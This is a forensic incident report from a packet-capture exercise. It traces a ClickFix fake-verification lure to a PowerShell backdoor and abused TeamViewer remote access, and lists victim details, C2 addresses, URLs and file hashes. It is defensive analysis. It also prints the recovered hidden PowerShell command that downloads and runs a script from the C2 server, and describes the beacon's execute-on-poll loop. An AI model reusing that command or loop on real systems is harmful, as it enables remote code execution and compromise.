# Incident Report — PCAP Forensic Analysis
**Case:** mta-2025-01-22 | **Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` only (no IDS/Suricata alert exports provided — all attribution below is behavioral)

## Victim Host

| Field | Value |
|---|---|
| IPv4 | **10.1.17.215** |
| MAC address | **00:d0:b7:26:4a:74** |
| Windows hostname | **DESKTOP-L8C5GSJ** (AD domain `bluemoontuesday.com`; NetBIOS domain `BLUEMOONTUESDAY`) |
| Logged-in user | **shutchenson** (confirmed via Kerberos `CNameString`) |
| Local DC/gateway | 10.1.17.2 (BLUEMOONTUESDAY) |

## Malware Family and Attribution

**Behavioral attribution only — no signature confirmation available** (no Suricata/IDS export was present in the evidence set, only the raw pcap).

The traffic shows a **ClickFix-style fake-verification lure** leading to a **PowerShell backdoor downloader** that ultimately deploys a **legitimate TeamViewer client for attacker-directed remote-control access** (RMM-tool abuse RAT). This class of activity is publicly associated with "ClickFix"-delivered TeamViewer RAT campaigns; I am not asserting a specific named threat-actor group since no IDS signature ties it to one.

**Delivery chain observed:**
1. `google-authenticator.burleson-appliance.net` (t=38.3s) — fake Google-Authenticator "verify" lure (TLS SNI, Cloudflare-fronted, 104.21.x.1)
2. `authenticatoor.org` → **82.221.136.26:443** (t=39.5s) — fake CAPTCHA / ClickFix page
3. `appointedtimeagriculture.com` → **217.70.186.109:443** (t=52.7s) — clipboard-hijack command stage
4. t=60.3s: victim issues `GET http://5.252.153.241/api/file/get-file/264872` with UA `MSIE 7.0 ... Trident/7.0 .NET CLR` — the default WinINet UA used by `mshta.exe`/`regsvr32`, confirming the pasted Run-dialog command executed a Windows script host to fetch this file (not a browser).
5. `264872` (`Content-Type: application/octet-stream`) is a COM scriptlet (`<component><script language="VBScript">`) that launches hidden PowerShell:
   ```
   powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"
   ```
   (opens a decoy Microsoft tab while silently fetching stage 2).
6. `29842.ps1` / `pas.ps1` (identical, obfuscated Base64) decode to a persistent backdoor loop: computes the victim's `C:` volume serial number as a numeric bot ID (`1517096937`), then loops `DownloadString("http://5.252.153.241/<bot-id>")` → `Invoke-Expression` on the result every 5 seconds — an interactive remote-command-execution channel.
7. Beacon check-ins observed reporting task status back to the C2:
   - `k=message = startup shortcut created; status = success;` (t=129s)
   - `k=script: RunRH, status: OK, message: PS process started` (t=882s, 2413s, 2578s)
8. Stage-3 payloads pulled via the same channel (t=125–129s): a full **TeamViewer** client (`TeamViewer`, `Teamviewer_Resource_fr`, `TV`), silently installed for attacker hands-on-keyboard access.
9. TeamViewer's own DynGate protocol then contacts the **real** TeamViewer master server (`master16.teamviewer.com`, 185.188.32.26) starting at t=611s to broker sessions (IDs 91930119/135/144/165/189), followed by data-channel traffic to 45.125.66.32:2917 and 45.125.66.252:443 — this is legitimate TeamViewer infrastructure being *abused*, not separately malicious C2.

## Indicators of Compromise

**Command-and-control:**
- `5.252.153.241:80` — primary C2 (bare-IP HTTP, no domain used). Serves payloads via `/api/file/get-file/<name>` and receives beacon/IEX check-ins at `/<victim-drive-serial>` (observed as `/1517096937`).

**Malicious/lure domains:**
- `google-authenticator.burleson-appliance.net` (→ 104.21.64.1 / .48.1 / .32.1 / .80.1 / .16.1 / .96.1 / .112.1, Cloudflare)
- `authenticatoor.org` (→ 82.221.136.26)
- `appointedtimeagriculture.com` (→ 217.70.186.109)

**Malicious URLs:**
- `http://5.252.153.241/api/file/get-file/264872`
- `http://5.252.153.241:80/api/file/get-file/29842.ps1`
- `http://5.252.153.241/api/file/get-file/pas.ps1`
- `http://5.252.153.241/api/file/get-file/TeamViewer`
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`
- `http://5.252.153.241/api/file/get-file/TV`
- `http://5.252.153.241/1517096937` (and successive beacon requests, ~5s interval)

**Transferred files (SHA256, extracted directly from the capture):**

| File | SHA256 | Size | Role |
|---|---|---|---|
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` | 417 B | COM scriptlet (VBScript) — stage-1 loader, spawns hidden PowerShell |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | 1,512 B | Obfuscated PowerShell backdoor/beacon loop |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | 1,553 B | Identical backdoor loop, secondary fetch |
| `TeamViewer` | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | 4,380,968 B | PE32 GUI EXE — legitimate TeamViewer client, dropped for remote-access abuse |
| `Teamviewer_Resource_fr` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | 668,968 B | PE32 DLL — TeamViewer French resource module |
| `TV` | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | 12,920 B | PE32 DLL — TeamViewer helper module |

**Context traffic (benign, not IOCs):** Windows Update/Delivery Optimization (`download.windowsupdate.com`, `msedge.b.tlu.dl.delivery.mp.microsoft.com`, `ctldl.windowsupdate.com`), Microsoft/Bing/MSN telemetry and ads, NTP, NCSI connectivity checks, AD/Kerberos/LDAP to the local DC, SSDP/mDNS/LLMNR local discovery, and the legitimate TeamViewer master server (185.188.32.26) once contextualized as attacker-abused infrastructure rather than attacker-owned.
